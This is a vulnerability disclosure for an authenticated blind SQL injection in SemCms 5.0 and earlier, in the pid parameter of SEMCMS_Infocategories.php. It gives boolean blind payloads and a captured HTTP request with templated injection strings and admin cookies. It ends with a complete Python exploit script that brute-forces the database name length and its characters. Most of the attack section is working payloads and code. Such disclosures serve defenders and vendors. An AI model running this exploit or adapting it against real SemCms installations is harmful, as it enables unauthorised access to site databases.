# SemCms <= 5.0 has a SQL Injection Vulnerability
##### Vulnerability Location: SEMCMS_Infocategories.php
##### Affected Range: SemCms <= 5.0
##### Vulnerability Cause: SemCms <= v5.0 was discovered to contain a SQL injection vulnerability.This allows an attacker to execute arbitrary code via the pid parameter in the SEMCMS_Infocategories.php component.
##### Vulnerability Impact: Obtain database access rights, and even DBA permissions.
##### Link:https://www.sem-cms.com/

# Vulnerability recurrence

After entering the background,URL：http://localhost:83/admin/SEMCMS_Infocategories.php?type=edit&pid=71&lgid=1&types=n

![image](https://github.com/user-attachments/assets/ec98a07a-55d9-4568-ac3f-b9fce439a8f8)

Among them, there is an SQL injection vulnerability in the pid parameter. Capture data packets and determine the database length: pid=if(length(database())>8,99,0)

![image](https://github.com/user-attachments/assets/7f7e939d-3fd8-4aeb-b6e4-fa11c9165d8b)
![image](https://github.com/user-attachments/assets/905a6e1a-d4b5-4c35-9986-c2249e27a45c)

As shown above, after Boolean blind annotation, the length of the database is obtained as 8. Next, determine the specific value of the database name:

![image](https://github.com/user-attachments/assets/9abfed4d-3527-49b5-8639-b2abbf4f5de6)

Finally, the database username is obtained as semcms50, and the yakit data packet:

```
GET /admin/SEMCMS_Infocategories.php?type=edit&pid=if(substr(database(),{{int(1-8)}},1)+like+"{{payload(word)}}",71,0)&lgid=1&types=n HTTP/1.1
Host: localhost:83
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Sec-Fetch-Dest: document
Accept-Language: zh-CN,zh;q=0.9
Cookie: scusername=%E6%80%BB%E8%B4%A6%E5%8F%B7; scuseradmin=Admin; scuserpass=c4ca4238a0b923820dcc509a6f75849b
Sec-Fetch-User: ?1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Site: same-origin
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://localhost:83/admin/SEMCMS_Infocategories.php?pid=2&lgid=1
Sec-Fetch-Mode: navigate
sec-ch-ua-platform: "Windows"
sec-ch-ua: "Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"
Accept-Encoding: gzip, deflate, br, zstd
```
# Code Analysis
Line 33 of `SEMCMS_Infocategories.php`

![image](https://github.com/user-attachments/assets/7dd10778-733b-4e98-9f1c-191f254f45cd)

The pid parameters were directly concatenated into the SQL statement, thereby causing an SQL injection vulnerability

# Vulnerability exploitation script
```
import requests
import string
import time
from urllib.parse import parse_qs, urlencode
# 需要通过页面的回显来修改判断的条件
# 需要修改后台路径
# 需要更新Cookie



# 发送请求
def send_request(url, headers):
    try:
        response = requests.get(
            url,
            headers=headers,
            timeout=10,
            verify=False
        )

        return response
    except Exception as e:
        print(f"请求失败: {e}")
        return None


# 爆破数据库名长度
def database_length():
    print("[*] 开始爆破数据库名长度...")
    for i in range(1,20):
        base_url = url + f'if(length(database())>{i},999,71)'
        resp = send_request(base_url,header).text
        if 'Company' in resp:
            print("数据库名长度为：" + str(i))
            return i 
            

# 爆破数据库名
def exploit_sql_injection(url, header, db_len):
    
    
    db_name = ""
    
    max_length = 32  # 假设数据库名最大长度
    
    # 字符集：小写字母、数字、常见符号
    charset = string.ascii_lowercase + string.digits + "-$@! "
    

    print("[*] 开始爆破数据库名...")

    for i in range(1,db_len+1):
        for j in charset:
            base_url = url + f'if(substr(database(),{i},1) like "{j}",71,999)'
            resp = send_request(base_url, header).text
            if 'Company' in resp:
                db_name += str(j)
                print(f"[+] 第{i}个位置的字符: '{j}' 匹配成功, 当前: {db_name}")
                break

    
    print(f"[*] 爆破完成! 数据库名: {db_name}")
    return db_name

if __name__ == "__main__":
    url = f"http://192.168.124.6:81/VvK4qw_Admin/SEMCMS_Infocategories.php?type=edit&lgid=1&types=n&pid="
    
    header = {
        "Cookie":"scusername=%E6%80%BB%E8%B4%A6%E5%8F%B7; scuseradmin=Admin; scuserpass=c4ca4238a0b923820dcc509a6f75849b"
    }

    db_len = database_length()

    if(db_len != 0):
        exploit_sql_injection(url, header,db_len)
    
```
